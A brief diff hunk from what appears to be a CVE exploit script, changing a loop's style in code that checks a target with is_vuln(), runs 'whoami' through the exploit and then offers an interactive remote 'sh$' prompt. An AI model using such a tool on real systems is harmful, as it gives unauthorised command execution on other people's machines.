@@ -59,7 +59,7 @@ if __name__ == '__main__':
     if cve.is_vuln():
         cve.exploit(cmd = "whoami")
         cmd = ''
-        while(True):
+        while True:
             cmd = input('sh$ ').lower()
             if (cmd == 'exit'):
                 sys.exit(0)
